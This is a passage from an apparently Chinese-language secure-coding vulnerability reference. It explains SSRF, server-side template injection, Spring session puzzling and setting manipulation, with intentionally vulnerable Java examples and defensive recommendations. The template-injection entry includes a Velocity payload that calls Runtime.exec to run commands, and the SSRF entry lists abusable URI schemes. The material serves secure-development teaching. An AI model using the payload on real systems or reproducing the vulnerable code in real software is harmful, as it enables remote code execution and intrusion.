<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1</p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1</p>
<p>[21] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1</p>
<p>[22] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 089</p>
<p>[23] Standards Mapping - SANS Top 25 2010 Insecure Interaction - CWE ID 089</p>
<p>[24] Standards Mapping - SANS Top 25 2011 Insecure Interaction - CWE ID 089</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002540 CAT I, APSC-DV-002560 CAT I</p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002540 CAT I, APSC-DV-002560 CAT I</p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002540 CAT I, APSC-DV-002560 CAT I</p>
<p>[35] Standards Mapping - Web Application Security Consortium 24 + 2 SQL Injection</p>
<p>[36] Standards Mapping - Web Application Security Consortium Version 2.00 SQL Injection (WASC-19)</p>
<h4 id="Server-Side-Request-Forgery"><a href="#Server-Side-Request-Forgery" class="headerlink" title="Server-Side Request Forgery"></a>Server-Side Request Forgery</h4><h5 id="ABSTRACT-319"><a href="#ABSTRACT-319" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>应用程序将使用用户控制的数据启动与第三方系统的连接，以创建资源 URI。</p>
<h5 id="EXPLANATION-320"><a href="#EXPLANATION-320" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>当攻击者可以影响应用程序服务器建立的网络连接时，将会发生服务器端的请求伪造。网络连接源自于应用程序服务器内部 IP，因此攻击者将可以使用此连接来避开网络控制，并扫描或攻击没有以其他方式暴露的内部资源。</p>
<p>示例：在下列中，攻击者将能够控制服务器连接至的 URL。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">String url = request.getParameter(&quot;url&quot;);</span><br><span class="line"></span><br><span class="line">CloseableHttpClient httpclient = HttpClients.createDefault();</span><br><span class="line"></span><br><span class="line">HttpGet httpGet = new HttpGet(url);</span><br><span class="line"></span><br><span class="line">CloseableHttpResponse response1 = httpclient.execute(httpGet);</span><br></pre></td></tr></table></figure>
<p>攻击者劫持网络连接的能力取决于他可以控制的 URI 的特定部分以及用于建立连接的库。例如，控制 URI 方案将使攻击者可以使用不同于 http 或 https 的协议，类似于下面这样：</p>
<ul>
<li><p>up://</p>
</li>
<li><p>ldap://</p>
</li>
<li><p>jar://</p>
</li>
<li><p>gopher://</p>
</li>
<li><p>mailto://</p>
</li>
<li><p>ssh2://</p>
</li>
<li><p>telnet://</p>
</li>
<li><p>expect://</p>
</li>
</ul>
<p>攻击者将可以利用劫持的此网络连接执行下列攻击：</p>
<ul>
<li><p>对内联网资源进行端口扫描。</p>
</li>
<li><p>避开防火墙。</p>
</li>
<li><p>攻击运行于应用程序服务器或内联网上易受攻击的程序。</p>
</li>
<li><p>使用 Injection 攻击或 CSRF 攻击内部/外部 Web 应用程序。</p>
</li>
<li><p>使用 file:// 方案访问本地文件。</p>
</li>
<li><p>在 Windows 系统上，file:// 方案和 UNC 路径可以允许攻击者扫描和访问内部共享。</p>
</li>
<li><p>执行 DNS 缓存中毒攻击。</p>
</li>
</ul>
<h5 id="RECOMMENDATIONS-318"><a href="#RECOMMENDATIONS-318" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>请勿基于用户控制的数据建立网络连接，并要确保请求发送给预期的目的地。如果需要提供用户数据来构建目的地 URI，请采用间接方法：例如创建一份合法资源名的列表，并且规定用户只能选择其中的文件名。通过这种方法，用户就不能直接由自己来指定资源的名称了。</p>
<p>但在某些情况下，这种方法并不可行，因为这样一份合法资源名的列表过于庞大、难以跟踪。因此，程序员通常在这种情况下采用黑名单的办法。在输入之前，黑名单会有选择地拒绝或避免潜在的危险字符。但是，任何这样一份黑名单都不可能是完整的，而且将随着时间的推移而过时。更好的方法是创建一份白名单，允许其中的字符出现在资源名称中，且只接受完全由这些被认可的字符组成的输入。</p>
<p>此外，如果需要，还要确保用户输入仅用于在目标系统上指定资源，但 URI 方案、主机和端口由应用程序控制。这样就可以大大减小攻击者能够造成的损害。</p>
<h5 id="REFERENCES-317"><a href="#REFERENCES-317" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Alexander Polyakov SSRF vs. Business critical applications BlackHat 2012</p>
<p>[2] SSRF bible. Cheatsheet ONSec Labs</p>
<p>[3] INPUT-1: Validate inputs Oracle</p>
<p>[4] Standards Mapping - Common Weakness Enumeration CWE ID 918</p>
<p>[5] Standards Mapping - FIPS200 SI</p>
<p>[6] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[7] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M5 Poor Authorization and Authentication</p>
<p>[8] Standards Mapping - OWASP Top 10 2004 A1 Unvalidated Input</p>
<p>[9] Standards Mapping - OWASP Top 10 2007 A4 Insecure Direct Object Reference</p>
<p>[10] Standards Mapping - OWASP Top 10 2010 A4 Insecure Direct Object References</p>
<p>[11] Standards Mapping - OWASP Top 10 2013 A4 Insecure Direct Object References</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.1</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.4</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.8</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.8</p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.8</p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.8</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3600 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3600 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3600 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3600 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3600 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3600 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3600 CAT II</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I</p>
<p>[28] Standards Mapping - Web Application Security Consortium Version 2.00 Abuse of Functionality (WASC-42)</p>
<h4 id="Server-Side-Template-Injection"><a href="#Server-Side-Template-Injection" class="headerlink" title="Server-Side Template Injection"></a>Server-Side Template Injection</h4><h5 id="ABSTRACT-320"><a href="#ABSTRACT-320" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>用户控制的数据用作模板引擎的模板，使得攻击者能够访问模板上下文，并在某些情况下在应用程序服务器中注入和运行任意代码。</p>
<h5 id="EXPLANATION-321"><a href="#EXPLANATION-321" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>模板引擎用于使用动态数据呈现内容。此上下文数据通常由用户控制并由模板进行格式化，以生成网页、电子邮件等。模板引擎通过使用代码构造（如条件语句、循环等）处理上下文数据，允许在模板中使用强大的语言表达式，以呈现动态内容。如果攻击者能够控制要呈现的模板，则他们将能够注入可暴露上下文数据，甚至在服务器上运行任意命令的表达式。</p>
<p>示例 1：下面的示例显示如何从 HTTP 请求中检索模板并进行呈现。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">// Set up the context data</span><br><span class="line"></span><br><span class="line">VelocityContext context = new VelocityContext();</span><br><span class="line"></span><br><span class="line">context.put( &quot;name&quot;, user.name );</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">// Load the template</span><br><span class="line"></span><br><span class="line">String template = getUserTemplateFromRequestBody(request);</span><br><span class="line"></span><br><span class="line">RuntimeServices runtimeServices = RuntimeSingleton.getRuntimeServices();</span><br><span class="line"></span><br><span class="line">StringReader reader = new StringReader(template);</span><br><span class="line"></span><br><span class="line">SimpleNode node = runtimeServices.parse(reader, &quot;myTemplate&quot;);</span><br><span class="line"></span><br><span class="line">template = new Template();</span><br><span class="line"></span><br><span class="line">template.setRuntimeServices(runtimeServices);</span><br><span class="line"></span><br><span class="line">template.setData(node);</span><br><span class="line"></span><br><span class="line">template.initDocument();</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">// Render the template with the context data</span><br><span class="line"></span><br><span class="line">StringWriter sw = new StringWriter();</span><br><span class="line"></span><br><span class="line">template.merge( context, sw );</span><br></pre></td></tr></table></figure>
<p>上述示例使用了 Velocity 作为模板引擎。对于该引擎，攻击者可以提交以下模板以在服务器上运行任意命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$name.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&lt;COMMAND&gt;)</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-319"><a href="#RECOMMENDATIONS-319" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>尽可能不要让用户提供模板。如果需要由用户提供模板，请谨慎执行输入验证，以防止在模板中注入恶意代码。</p>
<h5 id="REFERENCES-318"><a href="#REFERENCES-318" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Server-Side Template Injection: RCE for the modern webapp</p>
<p>[2] INPUT-1: Validate inputs Oracle</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 95</p>
<p>[4] Standards Mapping - FIPS200 SI</p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[7] Standards Mapping - OWASP Top 10 2004 A6 Injection Flaws</p>
<p>[8] Standards Mapping - OWASP Top 10 2007 A2 Injection Flaws</p>
<p>[9] Standards Mapping - OWASP Top 10 2010 A1 Injection</p>
<p>[10] Standards Mapping - OWASP Top 10 2013 A1 Injection</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.6</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.2</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1</p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1</p>
<p>[17] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 116</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3570 CAT I</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3570 CAT I</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3570 CAT I</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3570 CAT I</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3570 CAT I</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3570 CAT I</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3570 CAT I</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I</p>
<p>[28] Standards Mapping - Web Application Security Consortium Version 2.00 Improper Input Handling (WASC-20)</p>
<h4 id="Session-Puzzling-Spring"><a href="#Session-Puzzling-Spring" class="headerlink" title="Session Puzzling: Spring"></a>Session Puzzling: Spring</h4><h5 id="ABSTRACT-321"><a href="#ABSTRACT-321" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>攻击者可以修改 Spring 会话属性，这可能会导致滥用应用程序逻辑。</p>
<h5 id="EXPLANATION-322"><a href="#EXPLANATION-322" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>使用 @SessionAttributes 标注的类意味着，Spring 会将更改复制到会话对象中的模型属性。如果攻击者能够在模型属性中存储任意值，这些更改将在会话对象中复制，并可能得到应用程序信任。如果会话属性使用用户应当无法修改的可信赖数据进行初始化，攻击者则能够实施 Session Puzzling 攻击，滥用应用程序逻辑。</p>
<p>示例 1：以下控制器包含一种在成功登录时向会话加载用户数据的方法。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">@Controller</span><br><span class="line"></span><br><span class="line">@SessionAttributes(&quot;user&quot;)</span><br><span class="line"></span><br><span class="line">public class HomeController &#123;</span><br><span class="line"></span><br><span class="line">    ...	</span><br><span class="line"></span><br><span class="line">    @RequestMapping(value= &quot;/auth&quot;, method=RequestMethod.POST)</span><br><span class="line"></span><br><span class="line">    public String authHandler(@RequestParam String username, @RequestParam String password, RedirectAttributes attributes, Model model) &#123;</span><br><span class="line"></span><br><span class="line">        User user = userService.findByNamePassword(username, password);</span><br><span class="line"></span><br><span class="line">        if (user == null) &#123;</span><br><span class="line"></span><br><span class="line">            // Handle error</span><br><span class="line"></span><br><span class="line">            ...</span><br><span class="line"></span><br><span class="line">        &#125; else &#123;</span><br><span class="line"></span><br><span class="line">            // Handle success</span><br><span class="line"></span><br><span class="line">            attributes.addFlashAttribute(&quot;user&quot;, user);</span><br><span class="line"></span><br><span class="line">            return &quot;redirect:home&quot;;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>另一个控制器处理密码重置功能。它尝试从会话加载 User 实例，因为此类使用 @SessionAttributes(“user”) 标注，并使用它来验证密码重置问题。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">@Controller</span><br><span class="line"></span><br><span class="line">@SessionAttributes(&quot;user&quot;)</span><br><span class="line"></span><br><span class="line">public class ResetPasswordController &#123;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    @RequestMapping(value = &quot;/resetQuestion&quot;, method = RequestMethod.POST)</span><br><span class="line"></span><br><span class="line">    public String resetQuestionHandler(@RequestParam String answerReset, SessionStatus status, User user, Model model) &#123;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">        if (!user.getAnswer().equals(answerReset)) &#123;</span><br><span class="line"></span><br><span class="line">            // Handle error</span><br><span class="line"></span><br><span class="line">            ...</span><br><span class="line"></span><br><span class="line">        &#125; else &#123;</span><br><span class="line"></span><br><span class="line">            // Handle success </span><br><span class="line"></span><br><span class="line">            ...</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>开发人员的意图是从会话加载 user 实例，此会话是在登录过程中存储实例的位置。然而，Spring 将检查请求，并且尝试将其数据绑定到模型 user 实例。如果接收的请求包含可绑定到 User 类的数据，Spring 会将接收的数据合并到用户会话属性中。通过在 answerReset 查询参数中提交任意答案并提交相同值覆盖会话中存储的值，可以滥用这种情况。这样，攻击者可以为随机用户设置任意新密码。</p>
<h5 id="RECOMMENDATIONS-320"><a href="#RECOMMENDATIONS-320" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>使用 @SessionAttributes 标注时，请特别注意用户能够重写的会话属性。确保这些属性可被用户修改，且不包含任何可被攻击者通过滥用 Spring 自动绑定功能滥用的安全敏感数据。</p>
<p>示例 2：以下控制器使用 @SessionAttribute 标注（在方法参数上，不能与 @SessionAttributes 混淆）从会话对象加载用户实例，不合并任何传入请求参数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">@Controller</span><br><span class="line"></span><br><span class="line">public class ResetPasswordController &#123;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    @RequestMapping(value = &quot;/resetQuestion&quot;, method = RequestMethod.POST)</span><br><span class="line"></span><br><span class="line">    public String resetQuestionHandler(@RequestParam String answerReset, SessionStatus status, @SessionAttribute User user, Model model) &#123;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">        if (!user.getAnswer().equals(answerReset)) &#123;</span><br><span class="line"></span><br><span class="line">            // Handle error</span><br><span class="line"></span><br><span class="line">            ...</span><br><span class="line"></span><br><span class="line">        &#125; else &#123;</span><br><span class="line"></span><br><span class="line">            // Handle success </span><br><span class="line"></span><br><span class="line">            ...</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-319"><a href="#REFERENCES-319" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Alexey Tyurin Spring MVC and Autobinding vulns.</p>
<p>[2] Alexey Tyurin Autobinding vulns and Spring MVC</p>
<p>[3] INPUT-1: Validate inputs Oracle</p>
<p>[4] Standards Mapping - FIPS200 IA</p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-23 Session Authenticity (P1)</p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M9 Improper Session Handling</p>
<p>[7] Standards Mapping - OWASP Top 10 2004 A3 Broken Authentication and Session Management</p>
<p>[8] Standards Mapping - OWASP Top 10 2007 A7 Broken Authentication and Session Management</p>
<p>[9] Standards Mapping - OWASP Top 10 2010 A3 Broken Authentication and Session Management</p>
<p>[10] Standards Mapping - OWASP Top 10 2013 A2 Broken Authentication and Session Management</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.3</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.5.7</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.8</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.10</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.10</p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.10</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3090 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3405 CAT I</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3405 CAT I</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3405 CAT I</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3405 CAT I</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3405 CAT I</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3405 CAT I</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002250 CAT II, APSC-DV-002260 CAT II, APSC-DV-002270 CAT II, APSC-DV-002280 CAT II</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002250 CAT II, APSC-DV-002260 CAT II, APSC-DV-002270 CAT II, APSC-DV-002280 CAT II</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002250 CAT II, APSC-DV-002260 CAT II, APSC-DV-002270 CAT II, APSC-DV-002280 CAT II</p>
<h4 id="Setting-Manipulation"><a href="#Setting-Manipulation" class="headerlink" title="Setting Manipulation"></a>Setting Manipulation</h4><h5 id="ABSTRACT-322"><a href="#ABSTRACT-322" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>允许对系统设置进行外部控制可以导致服务中断或意外的应用程序行为。</p>
<h5 id="EXPLANATION-323"><a href="#EXPLANATION-323" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>当攻击者能够通过控制某些值来监控系统的行为、管理特定的资源、或在某个方面影响应用程序的功能时，即表示发生了 Setting Manipulation 漏洞。</p>
<p>由于 Setting Manipulation 漏洞影响到许多功能，因此，对它的任何说明都必然是不完整的。与其在 Setting Manipulation 这一类中寻找各个功能之间的紧密关系，不如往后退一步，考虑有哪些系统数值类型不能由攻击者来控制。</p>
<p>例 1：以下 Java 代码片段从 HttpServletRequest 中读取一个字符串，并将该字符串设置为数据库 Connection 中的当前目录。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">conn.setCatalog(request.getParamter(&quot;catalog&quot;));</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>在该例子中，攻击者通过提交一个不存在的目录名，或者连接到数据库中未授权的部分，从而可以引出一个错误。</p>
<p>总之，应禁止使用用户提供的数据或通过其他途径获取不可信任的数据，以防止攻击者控制某些敏感的数值。虽然攻击者控制这些数值的影响不会总能立刻显现，但是不要低估了攻击者的攻击力。</p>
<h5 id="RECOMMENDATIONS-321"><a href="#RECOMMENDATIONS-321" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>禁止由不可信赖的数据来控制敏感数值。在发生此种错误的诸多情况中，应用程序预期通过某种特定的输入，仅得到某一区间内的数值。如果可能的话，应用程序应仅通过输入从预定的安全数值集合中选择数据，而不是依靠输入得到期望的数值，从而确保应用程序行为得当。针对恶意输入，传递给敏感函数的数值应当是该集合中的某些安全选项的默认设置。即使无法事先了解安全数值集合，通常也可以检验输入是否在某个安全的数值区间内。若上述两种验证机制均不可行，则必须重新设计应用程序，以避免应用程序接受由用户提供的潜在危险数值。</p>
<h5 id="REFERENCES-320"><a href="#REFERENCES-320" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] INPUT-1: Validate inputs Oracle</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 15</p>
<p>[3] Standards Mapping - MISRA C 2012 Rule 1.3</p>
<p>[4] Standards Mapping - MISRA C++ 2008 Rule 0-3-1</p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M8 Security Decisions Via Untrusted Inputs</p>
<p>[7] Standards Mapping - OWASP Top 10 2004 A1 Unvalidated Input</p>
<p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.1</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I</p>
<p>[23] Standards Mapping - Web Application Security Consortium Version 2.00 Improper Input Handling (WASC-20)</p>
<h4 id="Spring-Beans-Injection"><a href="#Spring-Beans-Injection" class="headerlink" title="Spring Beans Injection"></a>Spring Beans Injection</h4><h5 id="ABSTRACT-323"><a href="#ABSTRACT-323" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>加载用户控制的 Bean 定义资源，可能让攻击者有机会在服务器上执行任意代码、滥用应用程序逻辑和/或导致拒绝服务。</p>
